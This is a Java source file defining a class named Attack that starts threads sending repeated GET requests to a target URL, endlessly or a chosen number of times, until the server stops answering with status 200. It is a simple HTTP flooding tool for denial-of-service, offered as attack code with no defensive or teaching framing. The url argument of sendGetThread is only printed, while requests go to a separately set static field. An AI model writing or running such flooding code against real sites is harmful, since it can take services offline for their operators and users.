import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class Attack {

    private static String GET_URL;


    public static int statusCode;

    public void setUrl(String url){
        GET_URL = url;
    }

    public static int sendGET() throws IOException {
        URL obj = new URL(GET_URL);
        HttpURLConnection con= (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        return con.getResponseCode();
    }

    public static void sendGetThread(int times, String url){
        //try create a thread. if threads are end, finish thread creating
        try {
            //create new thread
            new Thread(() -> {
                try {
                    // send GET request infinity, or setted time
                    if (times == 0) {
                        while (true) {
                            statusCode = sendGET();
                            System.out.println(url + " : " + statusCode );
                            if (statusCode != 200){
                                break;
                            }
                        }
                    }
                    else {
                        for (int i = 0; i < times; i++) {
                            statusCode = sendGET();
                            System.out.println(url + " : " + statusCode);
                            if (statusCode != 200){
                                break;
                            }
                        }
                    }
                } catch (IOException e) {
                    System.out.print(e);
                    return;
                }

            }).start();
        }catch (Exception e){
            System.out.print(e);
            return;
        }
        return;
    }

}
